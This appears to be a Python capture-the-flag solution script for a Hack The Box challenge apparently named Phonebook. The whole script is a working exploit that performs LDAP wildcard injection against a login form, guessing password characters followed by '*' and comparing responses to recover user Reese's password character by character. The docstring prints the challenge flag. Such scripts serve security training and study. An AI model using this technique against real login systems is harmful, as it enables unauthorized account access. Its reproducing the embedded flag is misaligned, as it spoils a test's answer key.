#!/usr/bin/python3

"""
:author Arturo Negreiros (aka H0n3yL04d)
:password is HTB{d1rectory_h4xx0r_is_k00l}
"""
from pwn import *
import signal
import time
import requests
import sys
import string
import os

def def_handler(sig, frame):
    print("\n\n[!] Exiting...")
    exit(1)

signal.signal(signal.SIGINT, def_handler)

# defining the possible characters for make the brute force
VALUES = string.ascii_lowercase+string.ascii_uppercase+string.punctuation+"0123456789"

VALUES = [x for x in VALUES]
VALUES.remove("*")

def request_comparison(url) -> str:

    return requests.post(url=url, data={
        "username":"Reese",
        "password":"*"
    }).text


def exploiting_login(url):
    sess = requests.session()
    # setting the password in empty
    # to make the password generator using brute force
    password = ''
    # defining login
    p = log.progress("Brute forcing phonebook password")

    while True:
        p.status(password)
        for x in VALUES:
            # password = x+"*"
            data = {
                "username": "Reese",
                "password": password + x + "*"
            }
            res_log = sess.post(url=url, data=data)

            if res_log.text == request_comparison(url):
                password +=  x
                break

            if password.endswith("}"):
                return password

def main():
    try:
        url = sys.argv[1]
        print(exploiting_login(url))
    except Exception as e:
        print(f"[!] {str(e)}")
        exit(1)
    except KeyboardInterrupt:
        print(f"[!!] Keyboard interrupt")
        exit(0)

if __name__ == "__main__":
    main()
